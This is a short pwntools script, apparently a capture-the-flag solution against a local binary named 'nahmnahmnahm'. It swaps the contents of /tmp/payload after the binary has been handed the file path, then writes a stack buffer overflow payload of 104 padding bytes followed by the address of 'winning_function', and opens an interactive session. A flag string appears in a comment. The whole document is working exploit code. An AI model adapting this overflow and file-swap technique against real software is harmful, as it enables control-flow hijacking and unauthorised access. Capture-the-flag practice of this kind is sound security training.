from pwn import *

exe = ELF("/home/user/nahmnahmnahm")
p = exe.process()

with open("/tmp/payload", "w") as f:
  f.write("hi")

p.sendline("/tmp/payload")

payload = b"a"*104
payload += p64(exe.symbols.winning_function)

with open("/tmp/payload", "wb") as f:
  f.write(payload)

p.sendline("")

p.interactive() # flag{d41d8cd98f00b204e9800998ecf8427e}

